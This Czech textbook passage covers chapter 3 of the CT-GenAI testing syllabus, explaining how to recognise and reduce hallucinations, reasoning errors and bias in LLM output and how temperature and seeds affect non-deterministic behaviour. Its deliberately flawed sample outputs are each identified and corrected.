---
kapitola: 3
varianta: vyklad
nadpis: Řízení rizik generativní AI v testování softwaru
podtitul: Jak poznat chybný výstup LLM, jak ochránit data, kolik stojí AI energie a které předpisy a standardy se k tomu vážou.
---

Třetí kapitola sylabu CT-GenAI má v sylabu vyhrazeno 160 minut. Ve zkoušce z ní padne deset otázek za jedenáct bodů. Jedna z nich je typu K3 a má dva body. V ní dostanete ukázku výstupu jazykového modelu a máte poznat, o jakou chybu jde. To je jádro celé kapitoly a výklad mu proto dává nejvíc místa.

Kapitola má čtyři oddíly. První popisuje tři typické vady výstupu: halucinace, chyby v uvažování a zkreslení. Ukazuje, jak je poznat a jak jim předcházet. Přidává i téma nedeterministického chování, tedy proč stejný prompt dává pokaždé jinou odpověď. Druhý oddíl řeší ochranu dat a bezpečnost: co hrozí, jaké útoky na modely existují a jak se bránit. Třetí oddíl se týká spotřeby energie a emisí CO₂. Čtvrtý jmenuje předpisy, standardy a rámce, které se k AI vztahují.

Sylabus pro tuto kapitolu uvádí tato klíčová slova. Obecná: **security** (bezpečnost), **vulnerability** (zranitelnost) a **data privacy** (ochrana dat a soukromí). Specifická pro generativní AI: **hallucination** (halucinace), **temperature** (teplota), **reasoning error** (chyba v uvažování), **bias** (zkreslení) a **context manipulation** (manipulace s kontextem). Všechna ve výkladu vysvětlím. Zkouška je jen v angličtině, proto anglické termíny uvádím vždy.

:::zkouska
Rozpis kapitoly 3 ve zkoušce: 3.1.1 jedna otázka (K1), 3.1.2 jedna otázka za dva body (K3), 3.1.3 jedna (K2), 3.1.4 jedna (K1), 3.2.1 jedna (K2), 3.2.2 dvě (K2), 3.2.3 jedna (K2), 3.3.1 jedna (K2), 3.4.1 jedna (K1). Útoky z oddílu 3.2.2 jsou jediné téma kapitoly se dvěma otázkami.
:::

## 3.1 Halucinace, chyby v uvažování a zkreslení

:::lo
GenAI-3.1.1 (K1) Recall the definitions of hallucinations, reasoning errors and biases in Generative AI systems
GenAI-3.1.2 (K3) Identify hallucinations, reasoning errors and biases in LLM output
GenAI-3.1.3 (K2) Summarize mitigation techniques for GenAI hallucinations, reasoning errors and biases in software test tasks
GenAI-3.1.4 (K1) Recall mitigation techniques for non-deterministic behavior of LLMs
:::

V první kapitole sylabu zazněla věta, na které stojí celá kapitola 3. Transformer vytváří text, který je statisticky věrohodný. Věrohodný ale neznamená správný. Model nepracuje s pravdou. Předpovídá další token podle toho, co viděl v trénovacích datech a co mu dáte do promptu.

Z toho plynou tři druhy vad ve výstupu. Sylabus je nazývá defekty, stejně jako vady v softwaru. Vadný výstup znamená vadný testware: testovací případy, skripty nebo data, která nesplní, co tester čekal. Tester proto musí umět vady ve výstupu najít a omezit jejich výskyt.

Opravu komplikuje **non-deterministic behaviour** (nedeterministické chování). Stejný model dá na stejný prompt pokaždé trochu jinou odpověď. Když vadu v jedné konverzaci opravíte, může se v další konverzaci objevit znovu. Oprava tedy nikdy není trvalá tak, jak jsme zvyklí u opraveného defektu v kódu.

### 3.1.1 Tři druhy vad ve výstupu LLM

#### Halucinace

**Hallucination** (halucinace) je výstup, který je fakticky nesprávný nebo nesouvisí se zadanou úlohou. Model si něco vymyslí a podá to se stejnou jistotou jako fakta. Text přitom působí profesionálně, a proto je halucinace nebezpečná.

V testování se halucinace projevuje třemi typickými způsoby. Model vytvoří testovací případy, které jsou smyšlené nebo k úloze nepatří. Vygeneruje testovací skript, který je chybný nebo vůbec nejde spustit, třeba proto, že volá neexistující funkci. Nebo navrhne testovací případ, který ověřuje akceptační kritérium, jež v požadavku vůbec není.

Poslední případ je nejzrádnější. Model doplní kritérium, které v podobné aplikaci obvykle bývá. Vypadá rozumně, a proto ho recenzent snadno přehlédne. Tým pak testuje něco, co nikdo nechtěl, a produkt může dostat defekt za chování, které je ve skutečnosti správné.

:::pojem term="hallucination"
Halucinace: výstup LLM, který je fakticky nesprávný nebo nesouvisí se zadanou úlohou. Glosář sylabu ji stručně definuje jako chybnou informaci vytvořenou LLM. V testování jde o smyšlené testovací případy, nefunkční skripty nebo kritéria, která v zadání nejsou.
:::

#### Chyba v uvažování

**Reasoning error** (chyba v uvažování) vzniká, když model špatně pochopí logickou strukturu úlohy. Jde o vztahy příčiny a následku, o podmínky typu „když A a zároveň B, pak C“ nebo o postup krok za krokem. Výsledkem je chybný závěr.

Sylabus to vysvětluje tím, že LLM nemá skutečné logické uvažování. Spoléhá na rozpoznávání vzorů (pattern matching). Proto selhává například v matematickém uvažování. Sylabus tu odkazuje na studii GSM-Symbolic (Mirzadeh 2024). Ta ukázala, že výkon modelů v jednoduchých slovních úlohách klesne, když se změní jen čísla nebo se přidá nepodstatná věta.

V testování se chyby v uvažování objevují tam, kde je potřeba logika. Sylabus jmenuje dva příklady: plánování testování a prioritizaci testovacích případů. Do stejné skupiny patří odhad pracnosti, výpočet rizika, rozhodovací tabulky a hraniční hodnoty. U chyby v uvažování bývají vstupní fakta správně. Model je jen špatně zkombinuje.

:::pojem term="reasoning error"
Chyba v uvažování: model špatně vyloží logickou strukturu úlohy, například příčinu a následek, podmínku nebo postup po krocích, a dojde k chybnému závěru. Vzniká, protože LLM místo logického odvozování rozpoznává vzory.
:::

#### Zkreslení

**Bias** (zkreslení) pochází z dat, na kterých se model učil. Zkreslený výstup systematicky upřednostňuje určitý druh informací, postupů nebo předpokladů. Sylabus uvádí příklad modelu trénovaného hlavně na anglických textech. Takový model může upozaďovat neanglické pohledy a zvyklosti.

V testování se zkreslení projeví hlavně při generování testovacích dat a při zpřesňování akceptačních kritérií. Model například vytvoří testovací klienty jen s anglickými jmény, americkými adresami a cenami v dolarech. Nebo v sadě testů převažují funkční testy a nefunkční testy, třeba výkonnostní nebo bezpečnostní, skoro chybí.

Zkreslení se od ostatních dvou vad liší tím, že se opakuje. Jedna halucinace je jednorázový výmysl. Jedna chyba v uvažování je jednorázové selhání logiky. Zkreslení je tendence, která se ukáže až při pohledu na více výstupů nebo na celek. Sylabus k tématu odkazuje na přehledovou studii Gallegos 2024.

:::pojem term="bias"
Zkreslení (bias): systematická tendence výstupu LLM upřednostňovat určité informace, postupy nebo předpoklady. Pochází z trénovacích dat. V testování se projeví například jednostrannými testovacími daty nebo nedostatkem nefunkčních testů.
:::

#### Odkud se vady berou

Sylabus uvádí dvě příčiny pro všechny tři vady. První je povaha trénovacích dat: obsahují mezery, chyby a nerovnováhu. Druhá jsou vnitřní omezení architektury transformer, kterou popisuje kapitola 1. Model předpovídá pravděpodobný další token, nikoli pravdivý. Kdo tyto příčiny zná, umí vady rychleji hledat a lépe jim předcházet.

Následující tabulka staví tři vady vedle sebe. Hodí se jako pomůcka u otázek, kde máte rozhodnout, o kterou vadu jde.

| Vada | Co se pokazilo | Typický znak ve výstupu | Příklad z testování |
|---|---|---|---|
| hallucination | obsah nemá oporu v zadání ani ve skutečnosti | objeví se něco, co ve vstupu není a neexistuje | test na funkci, která v požadavku chybí; volání neexistující metody |
| reasoning error | logika nad správnými fakty | vstupní fakta sedí, ale závěr nebo výpočet z nich neplyne | špatné pořadí podle rizika; chybně vyhodnocená podmínka |
| bias | systematický sklon z trénovacích dat | jednostrannost, která se opakuje napříč výstupy | jen anglická jména a USD; skoro žádné nefunkční testy |

:::zkouska
Rozlišovací otázka zní: co je ve výstupu navíc nebo jinak než ve vstupu. Model něco přidal nebo vymyslel? Halucinace. Model použil správné údaje, ale vyvodil z nich špatný závěr? Chyba v uvažování. Výstup je jednostranný a ta jednostrannost odpovídá běžným vzorům z trénovacích dat? Zkreslení. Distraktory často popisují jiný typ vady, nebo vadu způsobenou omezením kontextového okna. Ta do žádné ze tří kategorií nepatří.
:::

### 3.1.2 Jak vady ve výstupu poznat

Tento cíl je jediný K3 v kapitole. Nestačí znát definice. Musíte je umět použít na konkrétní výstup. Nejdřív projdu metody detekce, které sylabus jmenuje. Pak následuje řada ukázek, na kterých si rozpoznávání procvičíte.

#### Metody detekce podle sylabu

Sylabus uvádí běžné postupy pro každou vadu zvlášť. Provádějí se revizí, tedy lidskou kontrolou, nebo kombinací revize a automatizovaného ověření.

Pro halucinace jsou tři postupy. **Cross-verification** (křížové ověření) porovná výstup s existující dokumentací, požadavky a známým chováním systému. Nástroj může výstup automaticky porovnat se zdroji dat a označit nesoulad. **Domain expertise consultation** (konzultace s doménovým expertem) zapojí odborníka na danou oblast. Ten pozná jemné nepřesnosti, které automatická kontrola mine. **Consistency checks** (kontroly konzistence) ověří, že si výstupy neprotiřečí navzájem ani se známými informacemi. I tady pomáhá automatizace, protože umí hledat rozpory ve velkém objemu.

Pro chyby v uvažování jsou dva postupy. **Logical validation** (logická validace) prověří logický tok textu v revizních cyklech: zda je konzistentní, soudržný a zda kroky na sebe navazují. Nástroje mohou pomoci, ale složité případy posoudí člověk. **Output testing** (testování výstupu) znamená vygenerovaný testware spustit. Testovací případy nebo skripty se pustí proti testovanému objektu a výsledky se ověří. Podle druhu testwaru jde o částečně nebo zcela automatizovaný krok.

Pro zkreslení sylabus uvádí dvě kontroly. Revize ověří, zda vygenerovaný testware, například testovací kód nebo syntetická testovací data, věrně a vyváženě odpovídá definované testovací strategii a požadavkům na pokrytí. Druhá kontrola hledá zkreslení podle typů testů, typicky nedostatečně zastoupené nefunkční testy.

Hloubku kontroly určuje riziko. Sylabus říká, že konkrétní provedení závisí na odhadnuté úrovni rizika halucinací, chyb v uvažování nebo zkreslení v dané úloze. Pro platební transakce banky budete ověřovat každý výstup a spouštět všechny skripty. Pro koncept e-mailu kolegům stačí rychlé přečtení.

Následující tabulka metody shrnuje. Všimněte si, že metody pro zkreslení se dívají na celek, ne na jednotlivý výstup.

| Vada | Metoda | Co konkrétně dělám |
|---|---|---|
| hallucination | cross-verification | porovnám s požadavkem, specifikací, dokumentací API |
| hallucination | domain expertise consultation | dám výstup přečíst analytikovi nebo odborníkovi na doménu |
| hallucination | consistency checks | hledám rozpory mezi výstupy a se známými fakty |
| reasoning error | logical validation | projdu kroky úvahy a přepočítám výpočty |
| reasoning error | output testing | spustím test nebo skript proti testovanému objektu |
| bias | revize vůči strategii a pokrytí | porovnám rozložení dat a testů s testovací strategií |
| bias | kontrola typů testů | spočítám, kolik je funkčních a kolik nefunkčních testů |

:::zkouska
Metody se ve zkoušce mohou objevit i jako distraktory. Spuštění skriptu (output testing) patří sylabem k chybám v uvažování, ne k halucinacím. Neexistující metodu v kódu ale spuštění odhalí také. Rozhoduje, na co se otázka ptá: na metodu podle sylabu, nebo na typ vady v ukázce.
:::

#### Ukázka 1: smyšlené akceptační kritérium

Zadání pro model bylo uživatelský scénář z internetového bankovnictví se třemi akceptačními kritérii.

```text
Uživatelský scénář: Jako klient chci zadat jednorázový tuzemský příkaz k úhradě,
abych mohl zaplatit fakturu.
AC1: Částka musí být kladná a nejvýš 500 000 Kč.
AC2: Číslo účtu příjemce musí projít kontrolou formátu.
AC3: Příkaz se potvrzuje jednorázovým kódem z mobilní aplikace.
```

Model vrátil tyto testovací případy:

```text
TC-01 Zadání částky 0 Kč je odmítnuto (AC1).
TC-02 Zadání částky 500 000 Kč je přijato (AC1).
TC-03 Zadání částky 500 000,01 Kč je odmítnuto (AC1).
TC-04 Neplatný formát čísla účtu je odmítnut (AC2).
TC-05 Po potvrzení kódem příkaz přejde do stavu Odesláno (AC3).
TC-06 Po odeslání příkazu přijde klientovi potvrzovací SMS (AC4).
TC-07 Příkaz nad 100 000 Kč vyžaduje druhé schválení (AC3).
```

Rozbor. Testy TC-01 až TC-05 mají oporu v zadání. TC-06 odkazuje na kritérium AC4, které v zadání vůbec není. Model ho doplnil, protože potvrzovací SMS se v bankovních aplikacích objevuje často. TC-07 přiřazuje k AC3 pravidlo o druhém schválení, které nikdo nezadal. Obojí je halucinace. Pozná se křížovým ověřením: vezmu každý test a hledám jeho kritérium ve vstupu. Co nenajdu, je podezřelé.

Kdyby tým TC-06 použil, nahlásil by defekt „chybí potvrzovací SMS“. Vývojáři by ztratili čas a produktový vlastník by musel vysvětlovat, že SMS nikdy nebyla v plánu.

#### Ukázka 2: neexistující metoda v testovacím skriptu

Model měl napsat test v Pythonu s Playwrightem, který ověří, že tlačítko pro odeslání formuláře jde stisknout.

```python
from playwright.sync_api import Page, expect

def test_submit_button(page: Page):
    page.goto("https://localhost:8000/platba")
    tlacitko = page.get_by_role("button", name="Odeslat")
    expect(tlacitko).to_be_clickable()
    tlacitko.click()
```

Rozbor. Kód vypadá věrohodně, ale knihovna Playwright pro Python metodu `to_be_clickable()` nemá. Používá například `to_be_visible()` nebo `to_be_enabled()`. Pojem „clickable“ pochází ze Seleniu, kde existuje podmínka `element_to_be_clickable`. Model smíchal vzory ze dvou knihoven. Jde o halucinaci: skript volá něco, co neexistuje. Pozná se křížovým ověřením s dokumentací knihovny, a velmi rychle i spuštěním, které skončí chybou `AttributeError`.

#### Ukázka 3: chybné pořadí podle rizika

Model dostal pět oblastí se skóre pravděpodobnosti a dopadu na stupnici 1 až 5. Pravidlo bylo jasné: riziko je součin pravděpodobnosti a dopadu, testuje se od nejvyššího rizika.

```text
Oblast              P   D   Riziko   Priorita
Převod mezi účty    3   5   15       1
Výpis z účtu PDF    4   2   8        3
Změna limitu karty  2   5   10       2
Přihlášení          3   4   12       4
Nastavení vzhledu   3   1   3        5
```

Rozbor. Vstupní čísla model opsal správně a všechny součiny spočítal také správně. Chyba je v pořadí. Přihlášení má riziko 12, a mělo by tedy mít prioritu 2. Změna limitu karty (10) má být třetí a výpis z účtu (8) čtvrtý. Model nic nevymyslel, jen nedotáhl logiku řazení. Jde o chybu v uvažování. Odhalí ji logická validace: seřadím sloupec Riziko sám a porovnám s prioritou. U větší tabulky stačí jednoduchý skript.

#### Ukázka 4: špatně vyložená podmínka

Pravidlo produktu: poplatek za vedení účtu se odpouští, když je klient student nebo mladší 26 let, a zároveň má na účet měsíčně příjem aspoň 5 000 Kč. Model vytvořil rozhodovací tabulku.

```text
Případ  Student  Věk  Příjem/měsíc  Poplatek odpuštěn
1       ano      22   6 000         ano
2       ne       24   2 000         ano
3       ne       30   8 000         ne
4       ano      28   1 000         ne
```

Rozbor. Případy 1, 3 a 4 jsou správně. Případ 2 je chybný. Klient je mladší 26 let, ale příjem 2 000 Kč nesplňuje druhou část podmínky. Poplatek se tedy neodpouští. Model u mladého klienta druhou část podmínky přehlédl, jako by u věku pod 26 let příjem nehrál roli. Stejnou podmínku přitom v případu 4 vyhodnotil správně. Fakta sedí, selhala logika, takže jde o chybu v uvažování. Odhalí ji logická validace nebo testování výstupu: spustím test s těmito daty proti aplikaci a výsledek nebude odpovídat očekávání.

#### Ukázka 5: testovací data s jednostranným sklonem

Model měl vygenerovat dvacet testovacích klientů pro registraci do aplikace české pojišťovny. Zde je výřez:

```json
[
  {"jmeno": "John", "prijmeni": "Smith", "telefon": "+1 555 0101",
   "datum_narozeni": "07/04/1985", "ulice": "12 Oak Street"},
  {"jmeno": "Emily", "prijmeni": "Johnson", "telefon": "+1 555 0102",
   "datum_narozeni": "11/23/1990", "ulice": "88 Maple Avenue"},
  {"jmeno": "Michael", "prijmeni": "Brown", "telefon": "+1 555 0103",
   "datum_narozeni": "02/14/1978", "ulice": "5 Pine Road"}
]
```

Rozbor. Žádný jednotlivý záznam není vymyšlený nesmysl a nic se nepočítá. Problém je v celku: všech dvacet klientů má anglická jména, americké telefonní předvolby a datum ve formátu měsíc/den/rok. Chybí diakritika, dlouhá česká příjmení, jména s pomlčkou a české formáty. To je zkreslení z trénovacích dat, kde převládá angličtina. Pozná se revizí dat proti testovací strategii: strategie chce pokrýt české klienty, hraniční délky jmen a diakritiku. Výstup tomu neodpovídá.

#### Ukázka 6: chybějící nefunkční testy

Tester požádal o sadu testů pro nové API, které vrací stav pojistné smlouvy. Testovací strategie projektu vyžaduje i výkonnost a zabezpečení. Model vrátil 24 testů.

```text
Funkční testy (24):
- 200 OK pro existující smlouvu
- 404 pro neexistující číslo smlouvy
- 400 pro chybný formát čísla smlouvy
- ... (dalších 21 kombinací vstupů a stavových kódů)
Nefunkční testy (0)
```

Rozbor. Testy samy o sobě mohou být správně. Chybí ale celá skupina, kterou strategie vyžaduje: doba odezvy, chování pod zátěží, autentizace, autorizace mezi klienty. Sylabus tento jev uvádí přímo jako zkreslení související s typy testů. Pozná se kontrolou rozložení typů testů proti strategii.

#### Ukázka 7: vymyšlený odkaz na normu

Tester se ptal, podle které normy se řídí testování softwaru v autě.

```text
Pro testování softwaru řídicích jednotek se používá norma ISO 26262-11:2018,
část 11 „Testování softwarových komponent“, kapitola 7.4.3,
která předepisuje minimálně 95% pokrytí větví.
```

Rozbor. ISO 26262 opravdu existuje a týká se funkční bezpečnosti silničních vozidel. Část 11 této normy ale nese pokyny k polovodičům, ne k testování softwarových komponent. Software je v části 6. Tvrzení o 95 % pokrytí větví v uvedené kapitole je smyšlené. Výstup kombinuje skutečnou normu s vymyšlenými detaily, což je typická halucinace. Pozná se křížovým ověřením se zněním normy nebo konzultací s odborníkem na funkční bezpečnost. Číslo kapitoly a přesné procento působí důvěryhodně, ale právě takové detaily je třeba ověřit.

#### Ukázka 8: chyba ve výpočtu odhadu pracnosti

Zadání: tři testeři, každý zvládne 6 testovacích případů za den. Sada má 90 testovacích případů. K tomu dva dny na přípravu prostředí, které musí proběhnout před spuštěním. Kolik pracovních dní bude testování trvat?

```text
Kapacita týmu: 3 × 6 = 18 testovacích případů za den.
Provedení: 90 / 18 = 5 dní.
Příprava prostředí běží souběžně s prováděním, takže celkem 5 dní.
```

Rozbor. Výpočet kapacity i doby provedení je správný. Zadání ale říká, že příprava prostředí musí proběhnout před spuštěním. Nemůže tedy běžet souběžně. Správně je 2 + 5 = 7 pracovních dní. Model přehlédl závislost mezi kroky. To je chyba v uvažování o příčině a následku, ne halucinace: nic nového nepřidal, jen porušil zadané pořadí.

:::praxe
Příklad z oboru, kde Jan dělal výpočty, tedy CFD a MKP. Otázka pro model: „Simuluji obtékání profilu s modelem turbulence k-omega SST bez stěnových funkcí. Jaké y+ mám mít u stěny?“

Odpověď modelu: „Pro model k-omega SST se doporučuje první buňka v oblasti y+ mezi 30 a 300, aby ležela v logaritmické oblasti mezní vrstvy. Hodnoty pod 30 vedou k nepřesnému smykovému napětí.“

Odpověď zní odborně a obsahuje skutečná čísla. Rozsah 30 až 300 ale platí pro stěnové funkce. Když řešíte mezní vrstvu až ke stěně bez stěnových funkcí, potřebujete y+ kolem 1. Model spojil dvě správné informace do chybného doporučení. Kdo to nepozná, udělá hrubou síť a výsledky odporu budou mimo.

Druhá otázka z MKP: „V ostrém vnitřním rohu desky mi napětí roste s každým zjemněním sítě. Kolikrát mám ještě zjemnit, než výsledek zkonverguje?“ Model doporučil pokračovat ve zjemňování, dokud změna mezi dvěma sítěmi neklesne pod 2 %. V lineárně elastickém modelu s ostrým vnitřním rohem je ale singularita a napětí v ní roste bez omezení. Výsledek nezkonverguje nikdy. Správně je zaoblit roh podle skutečné geometrie, nebo vyhodnocovat napětí v dostatečné vzdálenosti od singularity.

V obou případech pomohla metoda, kterou sylabus nazývá konzultace s doménovým expertem. Tady byl expertem sám tazatel. Pro testera to znamená jediné: model je nejnebezpečnější v oboru, kterému sám nerozumíte. Konec příkladu.
:::

#### Praktická cvičení ze sylabu

Sylabus k tomuto cíli přidává dvě praktická cvičení úrovně H1. V prvním (HO-3.1.2a) konfrontujete aspoň dva různé modely se situací, kdy přidávají prvky, které ve vstupních datech nejsou. Například kritéria, která v zadání chybí. Měníte přitom prompt a sledujete, jak formulace ovlivní počet halucinací.

Ve druhém cvičení (HO-3.1.2b) řešíte úlohu z plánování testování, třeba odhad pracnosti nebo prioritizaci testovacích případů podle kapitoly 5 sylabu CTFL. Vstupní data mají takovou složitost, že úloha vyžaduje skutečné řešení problému. Výsledek modelu porovnáte s přesným výsledkem. Zkoušíte tři typy modelů: běžný LLM, malý model (SLM) a uvažující model (reasoning model). Měníte prompt a sledujete, zda se výsledek zlepší. Obě cvičení najdete rozpracovaná v části s praktickými cvičeními.

:::nad-ramec
Při rozpoznávání pomáhá jednoduchý postup ve třech otázkách. Za prvé: má každá část výstupu oporu ve vstupu nebo v ověřitelné skutečnosti? Pokud ne, hledejte halucinaci. Za druhé: plyne závěr z údajů, které výstup sám uvádí? Pokud ne, hledejte chybu v uvažování. Za třetí: je výstup vyvážený vzhledem k tomu, co chce strategie a pokrytí? Pokud ne, hledejte zkreslení. Jedna odpověď může obsahovat všechny tři vady najednou. Ve zkoušce ale otázka vždy míří na jednu převažující.
:::

### 3.1.3 Jak vadám předcházet

Sylabus uvádí, že halucinace, chyby v uvažování a zkreslení přicházejí častěji ve dvou situacích. Buď je prompt špatně navržený, nebo chybí relevantní kontextová data. Z toho vychází pět technik zmírnění.

**Provide complete context** (dodejte úplný kontext). Prompt má obsahovat všechny relevantní informace, jak to popisuje oddíl 2.1.1 o struktuře promptu. Model, který nemá informaci, si ji doplní z obecných vzorů. Tím vznikají halucinace. Když do promptu vložíte celý uživatelský scénář, akceptační kritéria a omezení, zbude modelu méně prostoru pro výmysly.

**Divide prompts into manageable segments** (rozdělte prompt na zvládnutelné části). Složitou úlohu rozložte na menší kroky pomocí řetězení promptů (prompt chaining) z oddílu 2.1.2. Výstup každého kroku ověřte dřív, než ho pošlete do dalšího. Chybu v uvažování tak chytíte brzy a nerozšíří se do dalších kroků. Například nejdřív testovací podmínky, pak testovací případy, nakonec skripty.

**Use clear, interpretable data formats** (používejte jasné a srozumitelné formáty dat). Vyhněte se formátům, které jsou nejednoznačné nebo pro model těžko čitelné. Strukturovaný a přímočarý formát pomůže modelu soustředit se na podstatu úlohy. Požadavky v tabulce s ID, popisem a kritériem fungují lépe než souvislý odstavec. Naskenované PDF s rozpadlou tabulkou funguje hůř než čistý text.

**Select the appropriate GenAI model for the task** (vyberte vhodný model pro úlohu). Použijte model, který byl pro danou úlohu natrénován nebo se pro ni hodí. Kritéria výběru rozebírá oddíl 5.1.3. Na generování kódu se hodí jiný model než na shrnutí dlouhého reportu. Na logické úlohy se hodí uvažující model.

**Compare results across models** (porovnejte výsledky více modelů). Kde to dává smysl, pošlete stejný prompt několika modelům a výstupy porovnejte. Rozdíly ukážou místa, kde je výstup nespolehlivý. Pomůže to vybrat nejspolehlivější výsledek.

Sylabus pak odkazuje na kapitolu 4. Tam jsou dvě doplňkové techniky, které výsledky LLM zlepšují: **retrieval-augmented generation (RAG)** (generování rozšířené o vyhledávání) a **fine-tuning** (doladění modelu). RAG dodá modelu relevantní dokumenty z vaší báze znalostí. Fine-tuning model dál trénuje na datech z vaší domény.

Následující tabulka ukazuje, proti které vadě která technika pomáhá nejvíc. Je to pomůcka k pochopení, sylabus takové přiřazení výslovně nedělá.

| Technika | Nejvíc pomáhá proti | Proč |
|---|---|---|
| úplný kontext | halucinacím | model nemusí domýšlet chybějící informace |
| rozdělení na kroky (prompt chaining) | chybám v uvažování | každý krok se ověří, chyba se nešíří |
| jasný formát dat | halucinacím i chybám v uvažování | méně prostoru pro špatný výklad vstupu |
| vhodný model | všem třem | model zná doménu nebo typ úlohy |
| porovnání více modelů | všem třem | rozdíly mezi modely ukážou podezřelá místa |

:::praxe
Testerka v bance generuje testovací případy pro změnu limitu platební karty. První verze promptu zněla: „Napiš testy na změnu limitu karty.“ Model vrátil třicet testů. Polovina ověřovala pravidla, která banka nemá, například denní limit pro výběry v zahraničí.

Druhá verze promptu obsahovala celý uživatelský scénář, tři akceptační kritéria v tabulce a větu „Používej jen kritéria z tabulky. Když něco chybí, napiš otázku, nedomýšlej.“ Úloha byla rozdělená na dva kroky: nejdřív testovací podmínky ke schválení, pak testovací případy. Počet smyšlených testů klesl na nulu a model položil dvě otázky k nejasnému kritériu. Ty otázky se ukázaly cennější než samotné testy. Konec příkladu.
:::

:::zkouska
Častý chyták: „volný, nestrukturovaný formát dá modelu prostor k lepší interpretaci“. To je opak toho, co sylabus říká. Strukturovaný a jasný formát snižuje nedorozumění. Neovlivňuje náročnost fine-tuningu a nezvyšuje kreativitu modelu. RAG a fine-tuning sylabus v oddílu 3.1.3 jen zmiňuje s odkazem na kapitolu 4, nejsou mezi pěti základními technikami.
:::

### 3.1.4 Nedeterministické chování a jak ho omezit

#### Proč model odpovídá pokaždé jinak

Nedeterministické chování znamená, že model dá na stejný vstup různé výstupy. Sylabus to vysvětluje pravděpodobnostním výběrem tokenů během **inference** (inference, tedy generování odpovědi). Model pro každý další token spočítá rozdělení pravděpodobností přes celý slovník. Pak z tohoto rozdělení vybírá. Při každém běhu může vybrat jinak.

Malá odchylka na začátku změní všechno, co následuje, protože každý další token závisí na předchozích. Proto sylabus upozorňuje, že riziko odchylek roste s délkou výstupu. Krátká odpověď „ano“ nebo „ne“ bývá stabilní. Sada padesáti testovacích případů se mezi dvěma běhy liší skoro vždy.

Pro testera to znamená tři problémy. Výsledek nejde přesně zopakovat. Opravená vada se může při dalším běhu vrátit. A nejde snadno porovnat dvě verze promptu, protože rozdíl mezi nimi se mísí s náhodou.

#### Teplota

**Temperature** (teplota) je parametr, který řídí míru náhodnosti a kreativity výstupu. Tak ji definuje glosář sylabu. Snížení teploty během inference zúží rozdělení pravděpodobností. Pravděpodobné tokeny dostanou ještě větší váhu a nepravděpodobné skoro žádnou. Výstup je pak konzistentnější.

Daň za to sylabus uvádí také. Nízká teplota omezuje kreativitu a rozmanitost. Výstupy jsou opakující se nebo přehnaně deterministické. Pro generování regresních testů ze specifikace to obvykle vadí málo. Pro hledání nečekaných scénářů v explorativním testování to vadí víc.

:::pojem term="temperature"
Teplota: parametr, který řídí náhodnost a kreativitu výstupu LLM. Nižší teplota zužuje rozdělení pravděpodobností při výběru tokenu. Výstup je konzistentnější, ale méně rozmanitý.
:::

:::nad-ramec
Pro inženýra je užitečné vidět, co teplota dělá matematicky. Model pro každý kandidátní token vrátí číslo zvané logit. Pravděpodobnosti vzniknou funkcí softmax, kde se každý logit nejdřív vydělí teplotou T. Platí tedy, že pravděpodobnost tokenu i je úměrná exp(z_i / T).

Představte si tři kandidáty na další slovo s logity 2,0, 1,0 a 0,5:

```text
                 token A   token B   token C
T = 2,0          0,48      0,29      0,23     plošší rozdělení, víc náhody
T = 1,0          0,63      0,23      0,14     výchozí stav
T = 0,5          0,84      0,11      0,04     ostřejší rozdělení, méně náhody
T → 0            1,00      0,00      0,00     vždy nejpravděpodobnější token
```

Rozsah teploty se liší podle poskytovatele, běžně od 0 do 1 nebo od 0 do 2. Některá rozhraní nabízejí i parametr top-p, který náhodu omezuje jinak: vybírá jen z nejmenší skupiny tokenů, jejichž pravděpodobnosti dají dohromady zadaný podíl. U některých modelů rozhraní nastavení teploty vůbec nenabízí. Ani teplota 0 v praxi nezaručí stejný výstup, protože výpočty na serveru nemusí probíhat pokaždé stejně. Nic z toho se ve zkoušce nezkouší.
:::

#### Náhodné semínko

**Random seed** (náhodné semínko, seed) je počáteční hodnota generátoru pseudonáhodných čísel. Některé implementace LLM ji umožňují nastavit. Se stejným semínkem se použije stejná posloupnost pseudonáhodných čísel. Sylabus pseudonáhodné hodnoty vysvětluje jako deterministické náhodné hodnoty. Výsledkem je lepší opakovatelnost.

Semínko nezužuje rozdělení pravděpodobností a nemění kreativitu výstupu. Pouze zajistí, že se z daného rozdělení vybírá stejně. Na velikosti čísla semínka nezáleží. Semínko 7 nevede k jinému druhu výstupu než semínko 7 000 000, jen k jiné konkrétní posloupnosti.

#### Úplnou opakovatelnost zaručit nelze

Sylabus říká výslovně, že úplnou reprodukovatelnost zaručit nelze. Teplota a semínko variabilitu snižují, neodstraní ji. Proto sylabus doporučuje ještě třetí věc. Riziko halucinací a chyb v uvažování lze snížit tím, že část ověřování výstupu zautomatizujete. Vznikne strukturovaný a konzistentní způsob hodnocení, který nezávisí na tom, jak se zrovna model trefil.

V praxi to vypadá takto. Výstup chcete ve strukturovaném formátu, třeba JSON s pevným schématem. Skript ověří, že výstup schématu odpovídá. Další kontroly hledají známé chyby: odkaz na neexistující kritérium, chybějící povinné pole, nepovolenou hodnotu. Tyto kontroly běží pokaždé stejně, i když výstup modelu pokaždé stejný není.

#### Porovnání opakovaných běhů

Nedeterminismus se dá změřit. Pošlete stejný prompt pětkrát se stejným nastavením. Výstupy uložte a porovnejte. Sledujte, které části se mezi běhy drží a které se mění. Co se mění, je méně spolehlivé. Pak snižte teplotu, případně nastavte semínko, a měření zopakujte.

```text
Prompt: "Vypiš hraniční hodnoty pro pole Věk s povoleným rozsahem 18 až 65."
Teplota 1,0, pět běhů:
běh 1: 17, 18, 65, 66
běh 2: 17, 18, 65, 66
běh 3: 17, 18, 19, 64, 65, 66
běh 4: 17, 18, 65, 66
běh 5: 18, 65
Teplota 0,2, pět běhů:
běhy 1–5: 17, 18, 65, 66
```

Výstup při teplotě 1,0 se lišil ve dvou z pěti běhů. Běh 3 přidal hodnoty pro tříbodovou analýzu hraničních hodnot. Ta je sama o sobě legitimní, jen nebyla požadovaná. Běh 5 vynechal neplatné hodnoty. Při teplotě 0,2 byly všechny běhy stejné. Čísla jsou ilustrační, ukazují postup, ne naměřené hodnoty. Vlastní měření popisuje cvičení CV-3-02.

:::praxe
Pro Janův projekt Účtenky to znamená konkrétní nastavení. Když model z fotografie účtenky vytahuje položky do JSON, má mít nízkou teplotu a pevné schéma výstupu. Výsledek kontroluje validátor a součet položek se porovná s celkovou částkou na účtence. Když součet nesedí, záznam jde k ruční kontrole. Opakovatelnost tu nezajišťuje model, ale kontrola za ním. Konec příkladu.
:::

:::zkouska
